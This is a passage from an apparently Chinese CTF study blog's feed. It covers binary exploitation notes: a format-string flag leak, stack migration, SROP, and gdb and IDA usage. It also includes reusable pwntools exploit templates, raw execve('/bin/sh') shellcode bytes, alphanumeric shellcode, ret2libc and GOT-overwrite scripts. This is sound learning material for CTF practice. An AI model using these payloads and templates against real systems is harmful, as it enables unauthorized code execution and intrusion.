class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs asm">pwndbg&gt; stack 20<br>00:0000│ rsp 0x7fffffffde08 —▸ 0x400890 (main+234) ◂— mov edi, 0x4009b8<br>01:0008│-040 0x7fffffffde10 ◂— 0x31000000<br>02:0010│-038 0x7fffffffde18 —▸ 0x602ca0 ◂— 0x313131313131 /* &#x27;111111&#x27; */<br>03:0018│-030 0x7fffffffde20 —▸ 0x6022a0 ◂— 0x602<br>04:0020│-028 0x7fffffffde28 —▸ 0x7fffffffde30 ◂— 0x3332312867616c66 (&#x27;flag(123&#x27;)<br>05:0028│-020 0x7fffffffde30 ◂— 0x3332312867616c66 (&#x27;flag(123&#x27;)<br>06:0030│-018 0x7fffffffde38 ◂— 0xffffff0a29363534<br>07:0038│-010 0x7fffffffde40 ◂— 0xffffffffffff<br>08:0040│-008 0x7fffffffde48 ◂— 0x8b11759410354500<br>09:0048│ rbp 0x7fffffffde50 ◂— 0x1<br>0a:0050│+008 0x7fffffffde58 —▸ 0x7ffff7c29d90 (__libc_start_call_main+128) ◂— mov edi, eax<br>0b:0058│+010 0x7fffffffde60 ◂— 0x0<br>0c:0060│+018 0x7fffffffde68 —▸ 0x4007a6 (main) ◂— push rbp<br>0d:0068│+020 0x7fffffffde70 ◂— 0x100000000<br>0e:0070│+028 0x7fffffffde78 —▸ 0x7fffffffdf68 —▸ 0x7fffffffe2e0 ◂— &#x27;/home/lpp/test2/goodluck&#x27;<br>0f:0078│+030 0x7fffffffde80 ◂— 0x0<br>10:0080│+038 0x7fffffffde88 ◂— 0x34d3b53f4cddbbf0<br>11:0088│+040 0x7fffffffde90 —▸ 0x7fffffffdf68 —▸ 0x7fffffffe2e0 ◂— &#x27;/home/lpp/test2/goodluck&#x27;<br>12:0090│+048 0x7fffffffde98 —▸ 0x4007a6 (main) ◂— push rbp<br>13:0098│+050 0x7fffffffdea0 ◂— 0x0<br></code></pre></td></tr></table></figure><p>可以看到我自己写的flag在rsp返回地址下面的第四位，所以如果我们想要打印flag距离格式化字符串的偏移就是5+4&#x3D;9。</p><p>exp：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br><span class="hljs-keyword">a</span>=<span class="hljs-built_in">process</span>(<span class="hljs-string">&#x27;./goodluck&#x27;</span>)<br>payload=b“%<span class="hljs-number">9</span>$s”<br><span class="hljs-comment">#gdb.attach(a)</span><br><span class="hljs-keyword">a</span>.sendline（payload）<br><span class="hljs-keyword">a</span>.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%EF%BC%88hijack%20got%EF%BC%89/"/>
    <url>/2024/09/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%EF%BC%88hijack%20got%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="格式化字符串漏洞（hijack-got）"><a href="#格式化字符串漏洞（hijack-got）" class="headerlink" title="格式化字符串漏洞（hijack got）"></a>格式化字符串漏洞（hijack got）</h2><p>主函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> command; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> s1[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [esp+14h] [ebp-2Ch] BYREF</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+3Ch] [ebp-4h]</span><br><br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>  ask_username(s1);<br>  ask_password(s1);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      print_prompt();<br>      command = get_command();<br>      v5 = command;<br>      <span class="hljs-keyword">if</span> ( command != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      put_file();<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( command == <span class="hljs-number">3</span> )<br>    &#123;<br>      show_dir();<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( command != <span class="hljs-number">1</span> )<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>      get_file();<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">char</span> *__cdecl <span class="hljs-title">ask_username</span><span class="hljs-params">(<span class="hljs-type">char</span> *dest)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> src[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [esp+14h] [ebp-34h] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+3Ch] [ebp-Ch]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Connected to ftp.hacker.server&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;220 Serv-U FTP Server v6.4 for WinSock ready...&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Name (ftp.hacker.server:Rainism):&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%40s&quot;</span>, src);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">39</span> &amp;&amp; src[i]; ++i )<br>    ++src[i];                                   <span class="hljs-comment">// 将你输入的都往后位移一位进行读取</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">strcpy</span>(dest, src);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/%E4%BA%8C%E8%B0%88%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    <url>/2024/09/16/%E4%BA%8C%E8%B0%88%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="Stack-Migration（栈迁移）"><a href="#Stack-Migration（栈迁移）" class="headerlink" title="Stack Migration（栈迁移）"></a>Stack Migration（栈迁移）</h1><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>1.通过overflow覆盖prev ebp的值，让程序在执行完当前函数后执行leave（mov esp,ebp ; pop ebp）恢复栈帧时，获取到错误的prev ebp 从而让ebp跳转到指定的位置</p><p>2.此时esp执行到我们之前写入的<code>gets</code>函数，<code>gets</code>取buf1处的地址作为参数(buf1的地址也就是我们之前劫持ebp跳转到的地址)，此时通过写入shellcode构造第二段rop填入buf1</p><p>3.此时程序执行完gets函数后执行leave指令，(mov esp,ebp)将esp移动到此前的ebp的位置，(pop ebp)此时ebp读取buf1中末尾的buf2处存放的地址，跳转到第二处buf空间，也就是buf2的位置</p><p>4.这时程序执行完puts函数，puts函数通过读取之前写入的任意函数的GOT表地址，打印出任意函数的GOT表地址，泄露出动态地址</p><p>5.程序执行完上一步的<code>pop</code>指令清空栈上的用过的任意函数的GOT表地址(防止程序seg falt)，执行<code>gets</code>函数以buf2中存放的地址作为参数，获取输入的内容，存放到buf2中，构建第三段rop</p><p>6.程序此时执行完leave指令，(mov esp ,ebp)将esp搬到ebp的位置，(pop ebp)将buf2中存放的buf1的地址赋给ebp</p><p>7.此时buf2中的rop中填充了system的动态地址（根据前面的<strong>任意函数泄露出来的动态地址-任意函数的静态地址+system函数的静态地址</strong>计算所得），并且还写入了<code>/bin/sh</code>字符串，从而执行了get shell的操作</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%A8%A1%E6%9D%BF/"/>
    <url>/2024/09/16/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%A8%A1%E6%9D%BF/</url>
    
    <content type="html"><![CDATA[<h4 id="shellcode模板"><a href="#shellcode模板" class="headerlink" title="shellcode模板"></a>shellcode模板</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;) //很重要一定要加上，可以知道代码哪出错误了</span><br>a=remote(<span class="hljs-string">&#x27;ip&#x27;</span>,<span class="hljs-string">&#x27;port&#x27;</span>)<br>bass=（找到bass可读可写的地址）<br>shellcode=asm(shellcraft.sh())<br>payload=shellcode.ljust(<span class="hljs-number">0x108</span>，<span class="hljs-string">b&quot;a&quot;</span>)+p64(bass)//小端序填满多少个字节，然后返回bass段<br>a.sendline(payload)<br>a.interactive()<br></code></pre></td></tr></table></figure><h6 id="由于使用-shellcraft-默认生成的字节数是-0x30，如果小于此字节数则需要自己写shellcode。"><a href="#由于使用-shellcraft-默认生成的字节数是-0x30，如果小于此字节数则需要自己写shellcode。" class="headerlink" title="由于使用 shellcraft 默认生成的字节数是 0x30，如果小于此字节数则需要自己写shellcode。"></a>由于使用 shellcraft 默认生成的字节数是 0x30，如果小于此字节数则需要自己写shellcode。</h6><p>32 位 短字节 shellcode -&gt; 21 字节 \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</p><p>64 位 较短的 shellcode -&gt;23 字节 \x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f \x05</p><h6 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asm">\x48\x31\xf6             ; xor    rsi, rsi       ; 清零 rsi 寄存器<br>\x56                     ; push   rsi            ; 将 rsi（现在是0）推入栈中，作为 execve 的第三个参数 envp<br>\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68 ; movabs rdi, 0x68732f2f6e69622f ; 将 &#x27;/bin//sh&#x27; 字符串的地址移动到 rdi<br>\x57                     ; push   rdi            ; 将 rdi（字符串地址）推入栈中<br>\x54                     ; push   rsp            ; 将栈指针 rsp 推入栈中，作为 execve 的第二个参数 argv<br>\x5f                     ; pop    rdi            ; 弹出栈顶元素到 rdi，rdi 现在指向 argv<br>\x6a\x3b                 ; push   0x3b           ; 推送 0x3b（execve 系统调用号）到栈中<br>\x58                     ; pop    rax            ; 弹出栈顶元素到 rax，rax 现在是 0x3b<br>\x99                     ; cdq                   ; 清零 rdx 寄存器（扩展eax到edx:eax，因为eax已经是0）<br>\x0f\x05                 ; syscall               ; 执行系统调用，调用 execve(&#x27;/bin//sh&#x27;, argv, envp)<br></code></pre></td></tr></table></figure><p>$$<br>清零 rsi 寄存器，因为 execve 系统调用需要一个空的环境变量指针 envp。<br>将 rsi 的值（0）推入栈中，作为 execve 的 envp 参数。<br>将字符串 &#x2F;bin&#x2F;&#x2F;sh 的地址移动到 rdi 寄存器，这是 execve 要执行的程序路径。<br>将 rdi 的值推入栈中，以便稍后作为 argv[0] 使用。<br>将栈指针 rsp 推入栈中，这样做是为了获取 argv 数组的地址。<br>将栈顶的值弹出到 rdi，现在 rdi 指向 argv 数组。<br>将 execve 系统调用的编号（0x3b）推入栈中。<br>将栈顶的值弹出到 rax，现在 rax 包含 execve 的系统调用号。<br>通过 cdq 清零 rdx 寄存器，因为 execve 需要一个空的 argv 终止符。<br>执行 syscall 指令，调用 execve(‘&#x2F;bin&#x2F;&#x2F;sh’, argv, envp) 来执行一个 shell。<br>$$</p><h4 id="可见字符的shellcode：需要进行转换（alpha3-master工具）"><a href="#可见字符的shellcode：需要进行转换（alpha3-master工具）" class="headerlink" title="可见字符的shellcode：需要进行转换（alpha3-master工具）"></a>可见字符的shellcode：需要进行转换（alpha3-master工具）</h4><p>64位：</p><p>Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</p><p>32位：</p><p>PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA</p><h4 id="ret2libc（64bit）模板"><a href="#ret2libc（64bit）模板" class="headerlink" title="ret2libc（64bit）模板"></a>ret2libc（64bit）模板</h4><p>libc做题姿势：</p><ol><li>ropper –file babyrop –search “pop rdi”（寻找可用的ret指令）</li><li></li></ol><p>from pwn import *<br>from LibcSearcher import *<br>#p&#x3D;remote(‘’,)<br>p&#x3D;process(‘’)<br>elf&#x3D;ELF(‘’)</p><p>#偏移<br>move&#x3D;<br>def get_addr():<br>return u64(p.recvuntil(b’\x7f’)[-6:].ljust(8, b’\x00’))      #接收泄露函数地址的函数</p><p>#地址<br>pop_rdi&#x3D;<br>ret&#x3D;<br>function_got&#x3D;elf.got[‘’]<br>function_plt&#x3D;elf.plt[‘’]<br>main&#x3D;elf.sym[‘main’]</p><p>#payload1<br>payload1&#x3D;b’a’*(move+8)+p64(pop_rdi)+p64(function_got)+p64(function_plt)+p64(main)</p><p>#接收<br>#p.recvuntil(‘’)</p><p>#发送payload<br>p.sendline(payload1)</p><p>#接收地址<br>target_addr&#x3D;get_addr()</p><p>#print(hex(target_addr))</p><p>#LibcSearcher匹配地址找system和binsh<br>libc&#x3D;LibcSearcher(‘function’,target_addr)<br>addr&#x3D;target_addr-libc.dump(‘function’)<br>binsh&#x3D;addr+libc.dump(‘str_bin_sh’)<br>sys&#x3D;addr+libc.dump(‘system’)</p><p>#payload2<br>payload2&#x3D;b’a’*(move+8)+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(sys)</p><p>#接收<br>#p.recvuntil(‘’)</p><p> line &#x3D; p.recvline().decode().strip()#.decode()：将接收到的字节串转换为Python字符串。#.strip()：去除字符串开头和结尾的空格和换行符。match &#x3D; re.search(r’0x[0-9a-fA-F]+’, line)value &#x3D; match.group(0)#返回第一个匹配到的字符串python</p><p>p.interactive()</p><h4 id="自动化-ret2csu"><a href="#自动化-ret2csu" class="headerlink" title="自动化(ret2csu)"></a>自动化(ret2csu)</h4><p>对于静态生成的程序可以使用ropper和ROPgadget来直接生成ropchain<br>ropper–file name –chain execveropper–file name –chain execve<br>ROPgadget–binary name –ropchain</p><p>input()是接受字符串类型的输入，也就是说他会把用户输入的所有东西转换为字符串型，当然数字被解析为字符串类型的时候依然是数字，被解析为整型的时候也是数字，看你需要什么类型，int()是转换函数，int（input（））的意思是把input接收的字符串类型转换为整型</p><h3 id="格式化字符串替换地址"><a href="#格式化字符串替换地址" class="headerlink" title="格式化字符串替换地址"></a>格式化字符串替换地址</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>context(<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;)<br><span class="hljs-comment">#a=process(&#x27;./babyfmt&#x27;)</span><br><span class="hljs-attribute">a</span>=remote(&#x27;node5.anna.nssctf.cn&#x27;,28508)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./babyfmt&#x27;)<br><span class="hljs-attribute">offest</span>=11<br><span class="hljs-attribute">system_plt</span>=elf.symbols[<span class="hljs-string">&#x27;backdoor&#x27;</span>]<br><span class="hljs-attribute">printf_got</span>=elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><br><span class="hljs-attribute">payload</span>=fmtstr_payload(offest,&#123;printf_got:system_plt&#125;)<br>a.sendline(payload)<br>a.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/%E5%A4%9A%E8%BF%9B%E7%A8%8B%E4%B8%8B%E7%9A%84%E7%88%86%E7%A0%B4%EF%BC%88fork%EF%BC%89/"/>
    <url>/2024/09/16/%E5%A4%9A%E8%BF%9B%E7%A8%8B%E4%B8%8B%E7%9A%84%E7%88%86%E7%A0%B4%EF%BC%88fork%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="多进程下的爆破（fork）"><a href="#多进程下的爆破（fork）" class="headerlink" title="多进程下的爆破（fork）"></a>多进程下的爆破（fork）</h2><p>pid_t fork(void)</p><p>创建一个新进程，操作系统会复制父进程的地址空间中的内容给子进程。调用fork函数后，子进程与父进程的执行顺序是无法确定的，子进程无法通过fork()来创建子进程</p><p>该函数有三种返回值</p><p>（1）在父进程中，fork返回新创建的子进程的进程id</p><p>（2）在子进程中，fork返回0</p><p>（3）如果出现错误，fork返回一个负值</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/%E8%B0%83%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    <url>/2024/09/16/%E8%B0%83%E8%AF%95%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h2 id="调试基础"><a href="#调试基础" class="headerlink" title="调试基础"></a>调试基础</h2><h4 id="基本命令包括以下几个："><a href="#基本命令包括以下几个：" class="headerlink" title="基本命令包括以下几个："></a>基本命令包括以下几个：</h4><p>- </p><p>  1.输入gdb或者gdb-multiarch program进行本地调试</p><p>- </p><p>  2.如果是本地程序的话，可以输入entry或者start进入第一条指令</p><p>  - </p><pre><code class="hljs">entry-   如果是本地调试有main函数，则可以输入main直接进入main函数  -     main</code></pre><p>- </p><p>  3.如果调试的程序有源代码，则输入n执行的时候是按照源代码一行一行执行的；</p><p>  - </p><pre><code class="hljs">如果没有源代码，则输入ni来按照汇编语言执行一条条指令</code></pre><p>  - </p><pre><code class="hljs">如果指令是调用了函数，则可以通过si进入调用内部</code></pre><p>- </p><p>  4.输入p 函数名可以打印出函数地址，然后使用nearpc 地址即可显示此函数的反汇编代码</p><p>  - </p><pre><code class="hljs">p scanf</code></pre><p>  - </p><pre><code class="hljs">nearpc 0x7ffff7a777f0</code></pre><p>  - </p><pre><code class="hljs">p/x：以16进制显示变量值</code></pre><p>  - </p><pre><code class="hljs">p/d：10进制显示</code></pre><p>  - </p><pre><code class="hljs">p/o：8进制显示</code></pre><p>- </p><p>  5.下断点，如果有符号，可以直接使用b 函数名下断点，如果没有，则需要使用b *address的方式下断点</p><p>  - </p><pre><code class="hljs">b read/b recv</code></pre><p>  - </p><pre><code class="hljs">b *0x40062b</code></pre><p>  - </p><pre><code class="hljs">通过-   bl列出所有断点 -   bc清除断点 -   bd临时禁用断点 -   be启用断点</code></pre><p>- </p><p>  6.下完断点之后需要执行到断点，从头开始运行输入r命令，继续运行输入c</p><p>- </p><p>  7.通过stack命令可以查看栈的数据</p><p>  - </p><pre><code class="hljs">stack 0x20 [0x20为查看的长度]</code></pre><p>- </p><p>  8.输入context可以重新刷新一下之前的调试界面</p><p>- </p><p>  9.可以通过hexdump查看栈的地址的内容</p><p>  - </p><pre><code class="hljs">hexdump 0x7fffffffe3b8</code></pre><p>  - </p><pre><code class="hljs">x/s 0x7fffffffe3b8</code></pre><p>- </p><p>  10.通过nextcall可以直接进行下一次调用</p><p>- </p><p>  11.vmmap可以查看内存布局</p><p>- </p><p>  12.可以使用p $eax查看寄存器的值，也可以使用i r eax查看</p><p>- </p><p>  13.如果使用的调试器为peda：</p><p>  - </p><pre><code class="hljs">pattern create 200</code></pre><p>  - </p><pre><code class="hljs">pattern offset 0xaddr</code></pre><p>- </p><p>  14.如果遇到栈溢出需要查看偏移量：</p><p>  - </p><pre><code class="hljs">cyclic 200生成200字节的长度数据</code></pre><p>  - </p><pre><code class="hljs">cyclic -l 覆盖的前四个字母：cyclic -l jaab,输出即为偏移量</code></pre><h3 id="IDA和OD快捷键"><a href="#IDA和OD快捷键" class="headerlink" title="IDA和OD快捷键"></a>IDA和OD快捷键</h3><h4 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h4><p>- </p><p>  y修改变量为类型加值</p><p>- </p><p>  n单纯修改变量</p><p>- </p><p>  G跳转到指定地址</p><p>- </p><p>  X查看交叉引用</p><p>- </p><p>  shift+F12查找字符串</p><p>- </p><p>  数组和</p><p>- </p><p>  空格切换图形和文本视图</p><p>- </p><p>  shift+e查看data段初始化的全局变量及静态变量</p><h4 id="OD"><a href="#OD" class="headerlink" title="OD"></a>OD</h4><p>- </p><p>  F2下断点</p><p>- </p><p>  F4运行到选中指令</p><p>- </p><p>  F8步过</p><p>- </p><p>  F7单步执行</p><p>- </p><p>  数据窗口跟随</p><p>- </p><p>  智能搜索可以查找的字符串更全</p><p>- </p><p>  od的基址与ida可能不一样</p><p>- </p><p>   在看<a href="http://www.52pojie.cn/thread-200439-1-1.html">Shark恒 破解教程</a> 时，有很多吾友对教程中按键的含义不懂，我发一个常用的快捷键列表，希望对新手有点帮助。 打开一个新的可执行程序 (F3) 重新运行当前调试的程序 (Ctrl+F2) 当前调试的程序 (Alt+F2) 运行选定的程序进行调试 (F9) 暂时停止被调试程序的执行 (F12) 单步进入被调试程序的 Call 中 (F7) 步过被调试程序的 Call (F8) 跟入被调试程序的 Call 中 (Ctrl+F11) 跟踪时跳过被调试程序的 Call (Ctrl+F12) 执行直到返回 (Ctrl+F9) 显示记录窗口 (Alt+L) 显示模块窗口 (Alt+E) 显示内存窗口 (Alt+M) 显示 CPU 窗口 (Alt+C) 显示补丁窗口 (Ctrl+P) 显示呼叫堆栈 (Alt+K) 显示断点窗口 (Alt+B) 打开调试选项窗口 (Alt+O)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/SROP/"/>
    <url>/2024/09/16/SROP/</url>
    
    <content type="html"><![CDATA[<h2 id="SROP（利用signal机制）"><a href="#SROP（利用signal机制）" class="headerlink" title="SROP（利用signal机制）"></a>SROP（利用signal机制）</h2><p>例题：ciscn_2019_s_3</p><p>程序较短，感觉直接看汇编比较好(该程序由内联汇编写成的)</p><p>首先了解一下64位的系统调用</p><p>传参方式：首先将系统调用号传入rax，然后将参数从左到右依次存入rdi，rsi，rdx等寄存器中，返回值存在rax寄存器</p><p>调用号：sys_read的调用号为0，sys_write的调用号为1，stub_execve的调用号为59，stub_rt_sigreturn的调用号为15</p><p>调用方式：使用syscall进行系统调用</p><p>在函数gadgets中直接暗示了接下来要使用的gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:00000000004004D6                               ; Attributes: bp-based frame<br>.text:00000000004004D6<br>.text:00000000004004D6                               public gadgets<br>.text:00000000004004D6                               gadgets proc near<br>.text:00000000004004D6                               ; __unwind &#123;<br>.text:00000000004004D6 55                            push    rbp<br>.text:00000000004004D7 48 89 E5                      mov     rbp, rsp<br>.text:00000000004004DA 48 C7 C0 0F 00 00 00          mov     rax, 0Fh<br>.text:00000000004004E1 C3                            retn<br>.text:00000000004004E1<br>.text:00000000004004E1                               gadgets endp ; sp-analysis failed<br>.text:00000000004004E1<br>.text:00000000004004E2                               ; ---------------------------------------------------------------------------<br>.text:00000000004004E2 48 C7 C0 3B 00 00 00          mov     rax, 3Bh ; &#x27;;&#x27;<br>.text:00000000004004E9 C3                            retn<br>.text:00000000004004E9<br>.text:00000000004004E9                               ; ---------------------------------------------------------------------------<br>.text:00000000004004EA 90                            db 90h<br>.text:00000000004004EB                               ; ---------------------------------------------------------------------------<br>.text:00000000004004EB 5D                            pop     rbp<br>.text:00000000004004EC C3                            retn<br></code></pre></td></tr></table></figure><p>​可以看到有mov rax， 3Bh指令，将rax设置为3B(59),也就是execve的函数调用号，execve函数的作用是执行一个新的程序，程序可以是二进制的可执行程序，也可以是shell，python脚本，和system函数类似，记录一下该指令的地址 gadget_addr&#x3D;0x4004e2。</p><p>​在这个调用execve的函数里也看到了return，我们可以利用这个return继续控制程序执行流，接下来就是去设置execve函数的参数，通过pop指令去控制函数参数，让rdi&#x3D;&#x2F;bin&#x2F;sh，rsi&#x3D;0，rdx&#x3D;0（64位程序参数传递顺序rdi，rsi，rdx，rcx，r8，r9），形成execve(“&#x2F;bin&#x2F;sh”, NULL, NULL)的系统调用，即可获得shell。</p><p>vuln函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">signed</span> __int64 <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">signed</span> __int64 v0; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br><br>  v0 = sys_read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x400</span>uLL);<br>  <span class="hljs-keyword">return</span> sys_write(<span class="hljs-number">1u</span>, buf, <span class="hljs-number">0x30</span>uLL);<br>&#125;<br><span class="hljs-keyword">asm</span>：<br>    .text:<span class="hljs-number">00000000004004</span>ED                               ; __unwind &#123;<br>.text:<span class="hljs-number">00000000004004</span>ED <span class="hljs-number">55</span>                            push    rbp<br>.text:<span class="hljs-number">00000000004004</span>EE <span class="hljs-number">48</span> <span class="hljs-number">89</span> E5                      mov     rbp, rsp<br>.text:<span class="hljs-number">00000000004004F</span>1 <span class="hljs-number">48</span> <span class="hljs-number">31</span> C0                      xor     rax, rax<br>.text:<span class="hljs-number">00000000004004F</span>4 BA <span class="hljs-number">00</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                mov     edx, <span class="hljs-number">400</span>h                       